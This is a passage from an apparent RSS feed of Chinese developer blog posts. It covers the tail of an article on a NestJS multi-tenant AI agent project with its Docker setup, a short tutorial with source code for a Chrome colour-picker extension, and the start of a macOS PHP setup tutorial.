<p>某些模型（如 qwen）会以 <code>&lt;tool_call&gt;</code> XML 标签输出工具调用。代码使用正则检测并过滤，避免 XML 标签泄露到前端。</p>
<h4 data-id="heading-16">3. 智能记忆管理</h4>
<p>对话记忆采用 <strong>滑动窗口 + LLM 自动摘要</strong> 的混合策略：</p>
<pre><code class="hljs">消息数 ≤ 10        → 全量返回，无压缩
10 &lt; 消息数 ≤ 20   → 滑动窗口，取最近 10 条
消息数 &gt; 20        → LLM 对早期消息生成摘要，摘要 + 最近 10 条
</code></pre>
<p>摘要存储在 <code>Conversation.summary</code> 字段，支持增量摘要（新对话内容追加到现有摘要上）。会话消息缓存在 Redis，TTL 3600 秒，减少数据库查询。</p>
<h4 data-id="heading-17">4. 多 LLM 供应商抽象</h4>
<p>统一的模型工厂，切换供应商只需一个参数：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 用户请求时指定</span>
{ <span class="hljs-attr">llmOptions</span>: { <span class="hljs-attr">provider</span>: <span class="hljs-string">"openai"</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">"gpt-4o"</span> } }
{ <span class="hljs-attr">llmOptions</span>: { <span class="hljs-attr">provider</span>: <span class="hljs-string">"dashscope"</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">"qwen-max"</span> } }
{ <span class="hljs-attr">llmOptions</span>: { <span class="hljs-attr">provider</span>: <span class="hljs-string">"anthropic"</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">"claude-sonnet-4-20250514"</span> } }
</code></pre>
<p>DashScope（通义千问）通过 OpenAI 兼容协议接入，自定义 <code>baseURL</code> 即可。同样的方式可以接入 SiliconFlow、Deepseek、vLLM 等任何兼容 OpenAI API 的服务。</p>
<h4 data-id="heading-18">5. 动态工具 + 多租户隔离</h4>
<p>工具系统采用注册表模式。<code>web_search</code> 是全局静态工具，而 <code>rag_retrieval</code> 因为需要 <code>tenantId</code> 上下文，采用<strong>工厂函数动态创建</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 每次请求动态创建，确保 tenantId 隔离</span>
<span class="hljs-keyword">const</span> ragTool = <span class="hljs-title function_">createRagRetrievalTool</span>(ragService, tenantId);
</code></pre>
<p>这样不同租户只能检索到自己的知识库数据。</p>
<hr/>
<h3 data-id="heading-19">项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">nest-agent/
├── src/                       <span class="hljs-comment"># 后端（NestJS）</span>
│   ├── auth/                  <span class="hljs-comment"># JWT 认证 + 多租户守卫</span>
│   ├── chat/                  <span class="hljs-comment"># 对话管理 + SSE 流式接口 + 记忆策略</span>
│   ├── agent/                 <span class="hljs-comment"># 核心：Supervisor 路由 + DAG 引擎</span>
│   │   ├── agent.service.ts   <span class="hljs-comment"># 编排入口 + AG-UI 事件转换</span>
│   │   ├── supervisor.factory.ts  <span class="hljs-comment"># Supervisor 有向图构建</span>
│   │   └── dag-engine.ts      <span class="hljs-comment"># DAG 编译执行引擎</span>
│   ├── rag/                   <span class="hljs-comment"># RAG 知识库（Milvus 向量检索）</span>
│   ├── llm/                   <span class="hljs-comment"># 多 LLM 供应商抽象</span>
│   ├── tools/                 <span class="hljs-comment"># 工具注册中心</span>
│   ├── redis/                 <span class="hljs-comment"># Redis 缓存</span>
│   ├── entities/              <span class="hljs-comment"># TypeORM 实体</span>
│   └── common/                <span class="hljs-comment"># AG-UI 协议定义、配置、异常过滤器</span>
├── web/                       <span class="hljs-comment"># 前端（React + shadcn/ui + Vite）</span>
│   └── src/
│       ├── pages/             <span class="hljs-comment"># 对话、工作流、知识库、登录</span>
│       ├── components/        <span class="hljs-comment"># 布局 + shadcn/ui 组件</span>
│       └── lib/               <span class="hljs-comment"># API 封装、认证上下文</span>
├── Dockerfile                 <span class="hljs-comment"># 多阶段构建</span>
├── docker-compose.yml         <span class="hljs-comment"># MySQL + Redis + Milvus 一键启动</span>
└── pnpm-workspace.yaml        <span class="hljs-comment"># monorepo 配置</span>
</code></pre>
<hr/>
<h3 data-id="heading-20">快速启动</h3>
<h4 data-id="heading-21">Docker 一键部署</h4>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/peng-yin/nest-agent.git
<span class="hljs-built_in">cd</span> nest-agent
<span class="hljs-built_in">cp</span> .env.example .<span class="hljs-built_in">env</span>
<span class="hljs-comment"># 编辑 .env，填入 OPENAI_API_KEY 等配置</span>
docker-compose up -d
<span class="hljs-comment"># 访问 http://localhost:3000</span>
</code></pre>
<h4 data-id="heading-22">本地开发</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动基础设施</span>
docker-compose up -d mysql redis etcd minio milvus-standalone

<span class="hljs-comment"># 2. 安装依赖</span>
pnpm install

<span class="hljs-comment"># 3. 启动后端（热重载）</span>
pnpm dev            <span class="hljs-comment"># http://localhost:3000</span>

<span class="hljs-comment"># 4. 启动前端（另开终端）</span>
pnpm dev:web        <span class="hljs-comment"># http://localhost:5173</span>
</code></pre>
<h4 data-id="heading-23">环境变量</h4>






























<table><thead><tr><th>变量</th><th>必填</th><th>说明</th></tr></thead><tbody><tr><td><code>OPENAI_API_KEY</code></td><td>是</td><td>OpenAI API Key</td></tr><tr><td><code>OPENAI_BASE_URL</code></td><td>否</td><td>自定义 API 地址（兼容 SiliconFlow/Deepseek）</td></tr><tr><td><code>TAVILY_API_KEY</code></td><td>否</td><td>网页搜索功能需要</td></tr><tr><td><code>JWT_SECRET</code></td><td>生产必填</td><td>JWT 签名密钥</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-24">踩过的坑</h3>
<p>分享几个开发过程中遇到的典型问题：</p>
<h4 data-id="heading-25">1. createReactAgent 子图的"思考"文本泄露</h4>
<p>使用 LangGraph 的 <code>createReactAgent</code> 时，内部 LLM 在决定调用工具前会输出一段"思考"文本。这些文本通过 <code>streamEvents</code> 被捕获并发送到前端，用户看到的是一堆 prompt 模板文字而非实际回答。</p>
<p><strong>解决方案</strong>：通过 <code>langgraph_checkpoint_ns</code> 中的 <code>langgraphNode</code> 和 <code>parentNode</code> 区分顶层节点和子图内部调用。子图内部 LLM 的 <code>langgraphNode</code> 是 <code>"agent"</code>，而 <code>parentNode</code> 是 <code>"researcher"</code>，两者不同；普通顶层节点两者相同。利用 <code>langgraphNode !== parentNode</code> 识别嵌套调用，将工具调用前的文本暂存丢弃。</p>
<h4 data-id="heading-26">2. StateGraph 节点的 checkpointNs 理解偏差</h4>
<p>最初以为只有 <code>createReactAgent</code> 构建的子图才有 <code>checkpointNs</code>，但实际上 StateGraph 中所有节点都有。导致 <code>responder</code>（直接回答）的正常文本也被错误暂存。debug 日志大法好。</p>
<h4 data-id="heading-27">3. 阿里云 DashScope 的 XML 工具调用</h4>
<p>通过 OpenAI 兼容 API 调用 qwen 模型时，部分场景下工具调用不走标准的 <code>tool_calls</code> 字段，而是在文本中输出 <code>&lt;tool_call&gt;</code> XML 标签。需要正则检测并过滤，否则前端会显示一堆 XML。</p>
<hr/>
<h3 data-id="heading-28">后续计划</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 支持更多工具（代码执行、文件上传、图片生成等）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 工作流可视化编辑器（拖拽式 DAG 编辑）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Agent 执行过程的可视化 Trace</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 支持更多向量数据库（Pinecone、Qdrant）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 支持文件上传（PDF、Word 等文档直接入库）</li>
</ul>
<hr/>
<h3 data-id="heading-29">写在最后</h3>
<p>这个项目从架构设计到编码实现，全部由一个人完成。涵盖了 Agent 编排、流式通信、RAG 检索、多租户隔离等多个技术领域，希望能为 Node.js/TypeScript 生态的 AI Agent 开发提供一个可参考的实践案例。</p>
<p>代码完全开源，如果这个项目对你有帮助，或者你对 NestJS + AI Agent 感兴趣，欢迎：</p>
<ul>
<li>⭐ <strong>Star</strong> 这个项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpeng-yin%2Fnest-agent" target="_blank" title="https://github.com/peng-yin/nest-agent" ref="nofollow noopener noreferrer">GitHub - nest-agent</a></li>
<li>🐛 提 Issue 或 PR，一起完善</li>
<li>💬 留言交流，分享你的想法</li>
</ul>
<p>感谢阅读！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谷歌浏览器取色器插件源码学习分享]]></title>    <link>https://juejin.cn/post/7605537925149884468</link>    <guid>https://juejin.cn/post/7605537925149884468</guid>    <pubDate>2026-02-12T13:24:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605537925149884468" data-draft-id="7605542907118125108" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谷歌浏览器取色器插件源码学习分享"/> <meta itemprop="keywords" content="前端,Google,浏览器"/> <meta itemprop="datePublished" content="2026-02-12T13:24:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Json_"/> <meta itemprop="url" content="https://juejin.cn/user/1511154281613834"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谷歌浏览器取色器插件源码学习分享
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1511154281613834/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Json_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:24:20.000Z" title="Thu Feb 12 2026 13:24:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在使用谷歌浏览器的时候，我们经常会使用到浏览器插件，作为技术肯定也要学习一下浏览器插件的开发咯，这篇文章给大家分享一个 我最近开发的一个浏览器插件-取色器，因为是学习阶段，所以功能做的还是比较简单的。</p>
<p>插件样子</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6735fc19e17a4cdf87ec9519cab9b023~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnNvbl8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771507460&amp;x-signature=hl%2BdfTnn4aH9I1x7pR8gTL0q4yE%3D" alt="image.png" loading="lazy"/></p>
<p>使用技术：html css和js</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5adc84c4a52448992b618a46f42f0ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnNvbl8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771507460&amp;x-signature=wjTTS%2BRniCK7GWjqvL%2BAscamwUM%3D" alt="image.png" loading="lazy"/></p>
<p>插件部分代码：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>取色器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">font-family</span>: Arial, sans-serif;
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
    }
    <span class="hljs-selector-tag">h3</span> {
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">15px</span> <span class="hljs-number">0</span>;
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
    }
    <span class="hljs-selector-id">#startBtn</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#667eea</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#764ba2</span> <span class="hljs-number">100%</span>);
      <span class="hljs-attribute">color</span>: white;
      <span class="hljs-attribute">border</span>: none;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
      <span class="hljs-attribute">font-weight</span>: bold;
      <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.2s</span>, box-shadow <span class="hljs-number">0.2s</span>;
    }
    <span class="hljs-selector-id">#startBtn</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">102</span>, <span class="hljs-number">126</span>, <span class="hljs-number">234</span>, <span class="hljs-number">0.4</span>);
    }
    <span class="hljs-selector-id">#startBtn</span><span class="hljs-selector-pseudo">:active</span> {
      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>);
    }
    <span class="hljs-selector-class">.tip</span> {
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;
    }
    <span class="hljs-selector-class">.ad</span> {
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">11px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
    }
    <span class="hljs-selector-class">.ad</span> <span class="hljs-selector-tag">a</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#667eea</span>;
      <span class="hljs-attribute">text-decoration</span>: none;
    }
    <span class="hljs-selector-class">.ad</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">text-decoration</span>: underline;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>🎨 取色器<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"startBtn"</span>&gt;</span>开始取色<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tip"</span>&gt;</span>
    点击按钮后，在网页上任意位置<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
    左键点击即可获取颜色值
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ad"</span>&gt;</span>
    万物OOP出品<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.wwwoop.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span>www.wwwoop.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"popup.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 获取开始取色按钮</span>
<span class="hljs-keyword">const</span> startBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'startBtn'</span>);

<span class="hljs-comment">// 点击开始取色按钮</span>
startBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-comment">// 向当前活动标签页发送消息，开始取色模式</span>
  <span class="hljs-keyword">const</span> [tab] = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">query</span>({ <span class="hljs-attr">active</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">currentWindow</span>: <span class="hljs-literal">true</span> });
  
  <span class="hljs-keyword">if</span> (tab &amp;&amp; tab.<span class="hljs-property">id</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 先尝试发送消息</span>
      <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">sendMessage</span>(tab.<span class="hljs-property">id</span>, { <span class="hljs-attr">action</span>: <span class="hljs-string">'startPickColor'</span> });
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 如果消息发送失败，说明content script未加载，先注入</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Content script未加载，正在注入...'</span>);
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">scripting</span>.<span class="hljs-title function_">executeScript</span>({
          <span class="hljs-attr">target</span>: { <span class="hljs-attr">tabId</span>: tab.<span class="hljs-property">id</span> },
          <span class="hljs-attr">files</span>: [<span class="hljs-string">'content.js'</span>]
        });
        <span class="hljs-comment">// 注入CSS</span>
        <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">scripting</span>.<span class="hljs-title function_">insertCSS</span>({
          <span class="hljs-attr">target</span>: { <span class="hljs-attr">tabId</span>: tab.<span class="hljs-property">id</span> },
          <span class="hljs-attr">files</span>: [<span class="hljs-string">'content.css'</span>]
        });
        <span class="hljs-comment">// 重新发送消息</span>
        <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">sendMessage</span>(tab.<span class="hljs-property">id</span>, { <span class="hljs-attr">action</span>: <span class="hljs-string">'startPickColor'</span> });
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();
      } <span class="hljs-keyword">catch</span> (injectError) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'注入脚本失败:'</span>, injectError);
        <span class="hljs-title function_">alert</span>(<span class="hljs-string">'无法在此页面使用取色器，请刷新页面后重试'</span>);
      }
    }
  }
});
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[macOS PHP 开发环境完整配置教程]]></title>    <link>https://juejin.cn/post/7605535884940542003</link>    <guid>https://juejin.cn/post/7605535884940542003</guid>    <pubDate>2026-02-12T13:38:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605535884940542003" data-draft-id="7605711582430068787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="macOS PHP 开发环境完整配置教程"/> <meta itemprop="keywords" content="PHP"/> <meta itemprop="datePublished" content="2026-02-12T13:38:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="理想小青年"/> <meta itemprop="url" content="https://juejin.cn/user/3153826762218552"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            macOS PHP 开发环境完整配置教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3153826762218552/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    理想小青年
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:38:28.000Z" title="Thu Feb 12 2026 13:38:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
